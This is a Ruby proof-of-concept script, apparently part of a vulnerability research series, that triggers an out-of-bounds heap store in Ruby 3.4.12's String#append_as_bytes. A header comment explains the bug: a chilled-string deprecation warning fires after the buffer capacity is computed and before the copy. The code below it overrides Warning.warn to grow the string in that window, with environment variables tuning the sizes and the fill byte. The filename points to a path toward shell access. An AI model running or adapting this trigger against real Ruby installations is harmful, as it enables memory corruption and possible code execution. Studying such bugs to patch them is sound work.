# W330: adjacent chilled-string `String#append_as_bytes` OOB store, same
# Ruby 3.4.12 -> 3.4.13 chilled-warning fix family as CVE-2026-132825.
#
# 3.4.12 string.c:3786-3841 computes `needed_capacity` from each argument's
# length, then calls str_ensure_available_capa, whose str_modify_keep_cr
# (:3404) emits the chilled deprecation warning; only afterwards does the
# memcpy re-read the argument with RSTRING_GETMEM (:3831).  Warning.warn is
# Ruby code, so it can grow the argument between the capacity calculation and
# the copy.  3.4.13 warns at :3810 before computing capacity.
#
# In-process experiment: no wire input, no debugger write, no marker, no
# ObjectSpace/maps read.  Usage:
#   ruby ruby2shell-chilled-append-bytes-oob.rb
# Environment: W330B_ACTION=none|recv|arg|both|safe, W330B_LEN (pre-hook
# argument bytes), W330B_ARG (post-hook argument bytes), W330B_BYTE (byte
# value), W330B_N (receiver replacement size), W330B_RECV=chilled|dup.

Warning[:deprecated] = true
$hook = 0
$recv = nil
$arg = nil

Warning.singleton_class.prepend(Module.new do
  def warn(*msgs, **kw)
    $hook += 1
    case ENV['W330B_ACTION']
    when 'recv' then $recv.replace('G' * Integer(ENV['W330B_N'] || '4096'))
    when 'arg'  then $arg.replace($fill)
    when 'both'
      $recv.replace('G' * Integer(ENV['W330B_N'] || '4096'))
      $arg.replace($fill)
    end
    super
  end
end)

$recv = ENV['W330B_RECV'] == 'dup' ? 'abc'.dup : :abc.to_s
$fill = Integer(ENV['W330B_BYTE'] || '90').chr * Integer(ENV['W330B_ARG'] || '8192')
$arg = Integer(ENV['W330B_BYTE'] || '90').chr * Integer(ENV['W330B_LEN'] || '4096')

begin
  result = $recv.append_as_bytes($arg)
  bytes = result.bytes
  puts "RESULT action=#{ENV['W330B_ACTION'] || 'none'} recv0=#{ENV['W330B_RECV'] || 'chilled'} " \
       "hook=#{$hook} out=#{bytes.length} arg=#{$arg.bytesize} " \
       "fill=#{bytes.count(Integer(ENV['W330B_BYTE'] || '90'))} " \
       "tail=#{bytes.last(8).map { |b| '%02x' % b }.join}"
rescue => e
  puts "RESULT action=#{ENV['W330B_ACTION'] || 'none'} hook=#{$hook} " \
       "raised=#{e.class}: #{e.message}"
end
